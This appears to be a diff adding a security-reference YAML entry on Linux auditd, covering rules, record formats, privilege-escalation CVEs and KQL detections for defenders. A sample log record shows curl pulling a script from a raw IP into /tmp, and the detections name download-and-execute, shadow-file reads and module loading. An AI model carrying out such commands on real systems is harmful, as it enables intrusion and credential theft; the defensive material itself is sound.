@@ -1,0 +1,325 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: linux-auditd
+name: Linux Audit (auditd)
+short: auditd
+aka:
+  - Linux Audit Framework
+  - auditd
+  - audispd
+  - audit.log
+  - ausearch / aureport
+vendor: Linux kernel / Red Hat
+category: os
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - linux
+  - audit
+  - syscall
+  - execve
+  - file-integrity
+  - kv
+  - privilege-escalation
+summary: The Linux kernel audit subsystem records system calls, program execution, file access, logins and privilege changes according to rules you define, and the auditd daemon writes them to /var/log/audit/audit.log as key=value records. It is the most detailed native process and file telemetry on Linux servers, but it is multi-line, noisy and only as good as its rule set.
+sourcetypes:
+  - st: auditd
+    desc: Raw audit.log records (type=SYSCALL, EXECVE, PATH, USER_LOGIN …) as key=value lines
+  - st: linux_audit
+    desc: Linux audit events, often interpreted by ausearch -i (names instead of numeric uid/syscall)
+  - st: linux_auditd_log
+    desc: audit.log read as a file by an agent (Cribl Edge, Universal Forwarder), one line per record
+  - st: linux:audit
+    desc: Splunk Add-on for Unix and Linux name for audit.log
+  - st: AUDITD
+    desc: Google SecOps (Chronicle) log type for Linux auditd
+facts:
+  First released: 2004 (Linux 2.6 kernel audit; userspace by Red Hat)
+  Platform: Any Linux distribution (RHEL, Ubuntu, Debian, SUSE, Amazon Linux); kernel component plus auditd userspace
+  Delivery model: Kernel subsystem + auditd daemon on every host
+  Log transport: File (/var/log/audit/audit.log), audisp plugins (af_unix, syslog, audisp-remote), Cribl Edge file or Exec (ausearch) source
+  Log format: key=value records prefixed type=… msg=audit(epoch:serial); one event = several records with the same serial
+  Typical volume: 1–50 MB per host per day depending on rules; execve and file-watch rules dominate
+  Rule sets: Distribution defaults, STIG/CIS rules, community sets such as Neo23x0/auditd
+  Cribl Pack: No dedicated auditd pack found; Cribl community guide covers Cribl Edge collection with ausearch
+placement:
+  slots:
+    - endpoint
+    - internal
+    - cloud
+  items:
+    - slot: endpoint
+      title: Linux servers and workstations
+      desc: Runs on every host. The kernel evaluates audit rules on each syscall and hands matching records to auditd.
+    - slot: internal
+      title: Data-center and jump hosts
+      desc: Bastion and admin hosts are the key place for execve and sudo auditing — who ran what as root.
+    - slot: cloud
+      title: Cloud VMs and container hosts
+      desc: EC2, Azure and GCP instances and Kubernetes nodes. On container hosts, auditd sees container processes as host processes (pid namespace aside).
+howItWorks:
+  - title: Kernel audit hooks
+    body: The kernel has hooks on syscall entry and exit, file system watches and security modules (SELinux, AppArmor). When a rule matches, the kernel builds audit records and sends them to userspace over a netlink socket.
+  - title: Rules
+    body: Rules are loaded by auditctl or from /etc/audit/rules.d/. Syscall rules (-a always,exit -F arch=b64 -S execve -k exec), file watches (-w /etc/shadow -p wa -k shadow) and control rules (buffer size, failure mode, -e 2 to lock). The -k key tags each event so it can be searched.
+  - title: Records and events
+    body: One event is several lines with the same msg=audit(epoch:serial) stamp, for example SYSCALL + EXECVE + CWD + PATH + PROCTITLE. They may interleave with other events, so a collector must group by serial (or use ausearch, which does this).
+  - title: Identity fields
+    body: uid/euid are the current identity; auid (audit uid, "loginuid") is the user who originally logged in and survives sudo and su. ses is the login session. auid=4294967295 (unset) means a daemon, not a user.
+  - title: auditd and dispatcher
+    body: auditd writes records to audit.log with rotation and can call audisp plugins to forward to syslog or a remote server. With name_format set in auditd.conf (needed for central collection) every record starts with node=<host>. If the backlog fills, the kernel follows the failure flag — log, printk or panic — and lost events show in auditctl -s.
+  - title: Hex encoding
+    body: Values with spaces or special characters (proctitle, EXECVE arguments, paths) are hex-encoded. ausearch -i decodes them and turns numeric ids into names, which is easier to read but changes field values.
+traffic:
+  handles:
+    - Process execution (execve)
+    - File reads and writes on watched paths
+    - Privilege changes (setuid, sudo, su)
+    - User and group management
+    - Logins and authentication (PAM)
+    - Kernel module loading
+    - SELinux / AppArmor decisions
+    - Network socket calls (connect, bind) when ruled
+  flow:
+    - step: Syscall
+      desc: A process calls execve, open, connect or another monitored syscall.
+    - step: Rule match
+      desc: The kernel checks the loaded audit rules at syscall entry and exit.
+    - step: Record build
+      desc: Matching records are created (SYSCALL, EXECVE, PATH, CWD, PROCTITLE) with one serial.
+    - step: Netlink to auditd
+      desc: Records go to the auditd daemon; a full backlog drops events or panics per policy.
+    - step: Write and dispatch
+      desc: auditd writes audit.log and passes records to audisp plugins (syslog, remote).
+    - step: Collect
+      desc: Cribl Edge tails the file or runs ausearch; Stream groups records by serial and forwards.
+logs:
+  - type: SYSCALL record
+    sourcetype: auditd
+    format: kv
+    share: 40–60 %
+    avg: ~450 B
+    desc: The anchor record of each syscall event — syscall number, success, exit code, process identity, executable and the rule key.
+    key:
+      - type
+      - syscall
+      - success
+      - auid
+      - uid
+      - euid
+      - comm
+      - exe
+      - key
+    noise:
+      - a0
+      - a1
+      - a2
+      - a3
+      - items
+      - fsuid
+      - sgid
+      - fsgid
+    sample: 'node=web01.example.com type=SYSCALL msg=audit(1731402862.123:4567): arch=c000003e syscall=59 success=yes exit=0 a0=55d1c2a3b4c0 a1=55d1c2a3b5e0 a2=55d1c2a3b6f0 a3=8 items=2 ppid=2201 pid=2245 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" subj=unconfined key="exec"'
+  - type: EXECVE record
+    sourcetype: linux_audit
+    format: kv
+    share: 15–30 %
+    avg: ~250 B
+    desc: The command-line arguments of an executed program, one aN field per argument. Same serial as its SYSCALL record.
+    key:
+      - type
+      - argc
+      - a0
+      - a1
+      - a2
+      - a3
+    noise:
+      - msg
+    sample: 'node=web01.example.com type=EXECVE msg=audit(1731402862.123:4567): argc=4 a0="curl" a1="-s" a2="http://203.0.113.50/x.sh" a3="-o/tmp/.x"'
+  - type: USER_LOGIN / USER_AUTH record
+    sourcetype: linux_auditd_log
+    format: kv
+    share: 1–5 %
+    avg: ~300 B
+    desc: PAM and sshd authentication results. The inner msg holds op, acct, exe, addr and res (success or failed).
+    key:
+      - type
+      - acct
+      - exe
+      - addr
+      - terminal
+      - res
+    noise:
+      - subj
+      - hostname
+    sample: "node=bastion01.example.com type=USER_LOGIN msg=audit(1731402901.456:4589): pid=2310 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=login acct=\"jdoe\" exe=\"/usr/sbin/sshd\" hostname=? addr=198.51.100.23 terminal=ssh res=failed'"
+cves:
+  - id: CVE-2024-1086
+    cvss: 7.8
+    year: 2024
+    kev: true
+    scope: device
+    title: Linux kernel nf_tables use-after-free local privilege escalation (used by ransomware)
+    affected: Linux kernel 3.15 up to 5.15.148, 6.1.x < 6.1.76, 6.2 – 6.6.14, 6.7.x < 6.7.3
+    fixed: 5.15.149, 6.1.76, 6.6.15, 6.7.3 (and distribution backports)
+    detect: An unprivileged user (auid ≠ 0) whose process turns euid=0 without sudo/su; unshare or user-namespace creation (unshare syscall, CLONE_NEWUSER) right before; exploit binaries run from /tmp.
+    avoid: Patch the kernel; disable unprivileged user namespaces (kernel.unprivileged_userns_clone=0) where not needed; audit execve from /tmp and /dev/shm.
+  - id: CVE-2021-4034
+    cvss: 7.8
+    year: 2022
+    kev: true
+    scope: device
+    title: polkit pkexec "PwnKit" local privilege escalation
+    affected: polkit (pkexec) before version 121 — nearly every Linux distribution since 2009
+    fixed: polkit 121 (and distribution backports)
+    detect: EXECVE of /usr/bin/pkexec with argc=0 (empty argument list); SYSCALL with exe=/usr/bin/pkexec and auid of a normal user followed by a root shell.
+    avoid: Patch polkit; as a stop-gap, remove the setuid bit (chmod 0755 /usr/bin/pkexec); audit rule -w /usr/bin/pkexec -p x.
+  - id: CVE-2023-4911
+    cvss: 7.8
+    year: 2023
+    kev: true
+    scope: device
+    title: glibc ld.so "Looney Tunables" GLIBC_TUNABLES buffer overflow to root
+    affected: GNU C Library 2.34 – 2.38
+    fixed: glibc 2.39 (and distribution backports)
+    detect: Repeated execve of a setuid binary (often su) by one user in a tight loop with crashes (ANOM_ABEND records), then a root process with that user's auid.
+    avoid: Patch glibc; audit ANOM_ABEND for setuid binaries; restrict local shell access.
+  - id: CVE-2025-32463
+    cvss: 7.8
+    year: 2025
+    kev: true
+    scope: device
+    title: sudo --chroot option loads attacker's nsswitch.conf, giving root to any local user
+    affected: sudo 1.9.14 – 1.9.17
+    fixed: sudo 1.9.17p1
+    detect: EXECVE of sudo with -R or --chroot by a user who is not in sudoers; files created under a user-writable directory named etc/nsswitch.conf; new root process with that auid.
+    avoid: Update sudo; audit rule on /usr/bin/sudo execve; alert on any sudo -R use.
+  - id: CVE-2024-3094
+    cvss: 10
+    year: 2024
+    kev: false
+    scope: traffic
+    title: xz-utils / liblzma backdoor in the sshd authentication path (SSH traffic)
+    affected: xz-utils 5.6.0 and 5.6.1 (mostly rolling and pre-release distributions)
+    detect: sshd (exe=/usr/sbin/sshd) spawning shells or commands for connections that have no USER_LOGIN success record; unusual CPU time in sshd pre-auth.
+    avoid: Downgrade xz-utils to 5.4.x as the distributions advised; audit execve with ppid=sshd; restrict SSH exposure.
+detections:
+  - title: Download and execute from temporary paths
+    severity: high
+    signals:
+      - type=EXECVE
+      - a0 in (curl, wget)
+      - an argument pointing to /tmp, /dev/shm or a raw IP
+    why: The usual first stage of Linux intrusions and cryptominer drops — fetch a script into a world-writable directory and run it.
+    kql: |-
+      dataset="linux_audit" type="EXECVE"
+      | where a0 in ("curl","wget") and (a2 contains "/tmp" or a3 contains "/tmp" or a3 contains "/dev/shm")
+      | summarize count() by node, a1, a2, a3
+    mitre:
+      - T1105
+      - T1059.004
+  - title: Root process from a non-root login without sudo
+    severity: high
+    signals:
+      - type=SYSCALL
+      - auid not 0 and not 4294967295
+      - euid=0
+      - comm not in (sudo, su)
+    why: A normal user's session becoming root outside sudo/su is the footprint of a local privilege-escalation exploit.
+    kql: |-
+      dataset="linux_audit" type="SYSCALL" euid="0"
+      | where auid != "0" and auid != "4294967295" and not(comm in ("sudo","su","sshd","crond"))
+      | summarize count() by node, auid, comm, exe
+    mitre:
+      - T1068
+      - T1548.001
+  - title: SSH brute force
+    severity: medium
+    signals:
+      - type=USER_LOGIN or USER_AUTH
+      - res=failed
+      - many failures per addr
+    why: Internet-facing SSH is continuously brute-forced; a success after many failures from the same address is a takeover.
+    kql: |-
+      dataset="linux_audit" type in ("USER_LOGIN","USER_AUTH") exe="/usr/sbin/sshd"
+      | summarize fails=countif(res startswith "failed"), ok=countif(res startswith "success"), users=dcount(acct) by addr, bin(_time, 10m)
+      | where fails > 20
+    mitre:
+      - T1110.001
+      - T1021.004
+  - title: Credential file access
+    severity: high
+    signals:
+      - key=shadow / identity watch
+      - comm not in passwd, useradd, chpasswd
+    why: Reading /etc/shadow outside the password tools is credential dumping for offline cracking.
+    kql: |-
+      dataset="linux_audit" type="SYSCALL" key in ("shadow","identity")
+      | where not(comm in ("passwd","useradd","usermod","chpasswd","sshd"))
+      | summarize count() by node, auid, comm, exe
+    mitre:
+      - T1003.008
+  - title: Kernel module loaded or audit rules changed
+    severity: medium
+    signals:
+      - syscall init_module / finit_module
+      - type=CONFIG_CHANGE
+      - comm=auditctl
+    why: Rootkits load kernel modules, and attackers disable or delete audit rules to go dark.
+    kql: |-
+      dataset="linux_audit"
+      | where type == "CONFIG_CHANGE" or (type == "SYSCALL" and syscall in ("175","313")) or comm == "auditctl"
+      | summarize count() by node, type, auid, comm
+    mitre:
+      - T1547.006
+      - T1562.012
+optimizations:
+  - title: Merge multi-line events by serial
+    saving: 20–35 %
+    fn: Aggregations / Event Breaker
+    how: Group SYSCALL, EXECVE, CWD, PATH and PROCTITLE records with the same msg=audit(…:serial) into one event, keeping identity fields once. Cuts repeated headers and makes detections single-event.
+    expr: "group by: msg serial  window: 2s"
+  - title: Drop known-noisy daemons
+    saving: 20–50 %
+    fn: Drop
+    how: Monitoring agents, cron and package managers trigger huge numbers of execve and file events. Drop by exe for a reviewed allow-list, or better, exclude them in the audit rules with -F exe!=.
+    expr: exe in ('/usr/bin/prometheus-node-exporter','/usr/sbin/crond') && type=='SYSCALL'
+  - title: Remove raw syscall arguments
+    saving: 10–20 %
+    fn: Eval
+    how: a0–a3 on SYSCALL records are raw pointers (not useful); PROCTITLE duplicates EXECVE. Remove them after the merge.
+    expr: "remove: a0, a1, a2, a3 when type=='SYSCALL'; drop type=='PROCTITLE' when EXECVE present"
+  - title: Decode hex values once
+    saving: 0 % (quality)
+    fn: Eval
+    how: Decode hex-encoded proctitle, EXECVE arguments and PATH name in the pipeline so the SIEM indexes readable command lines and analysts do not run ausearch by hand.
+    expr: /^[0-9A-F]+$/.test(a1)
+  - title: Route by rule key
+    saving: SIEM licence
+    fn: Routes
+    how: Security rule keys (exec as root, identity, shadow, modules, sudoers) → SIEM. Broad file-access keys → Lake only, replayed on demand.
+    expr: key in ('exec','identity','shadow','modules','sudoers','priv_esc')
+references:
+  - title: auditd(8) manual page
+    url: https://man7.org/linux/man-pages/man8/auditd.8.html
+  - title: audit.rules(7) manual page
+    url: https://man7.org/linux/man-pages/man7/audit.rules.7.html
+  - title: Linux audit documentation — field dictionary
+    url: https://github.com/linux-audit/audit-documentation/blob/main/specs/fields/field-dictionary.csv
+  - title: Linux auditd logging with Cribl Edge (Cribl Community)
+    url: https://knowledge.cribl.io/edge-55/linux-auditd-logging-with-cribl-edge-122
+  - title: Qualys PwnKit advisory (CVE-2021-4034)
+    url: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+  - title: Qualys Looney Tunables advisory (CVE-2023-4911)
+    url: https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
+  - title: sudo chroot advisory (CVE-2025-32463)
+    url: https://www.sudo.ws/security/advisories/chroot_bug/
+  - title: xz-utils backdoor disclosure (oss-security)
+    url: https://www.openwall.com/lists/oss-security/2024/03/29/4
+related:
+  - linux-syslog
+  - osquery
+  - falco
+  - sysmon
+  - crowdstrike
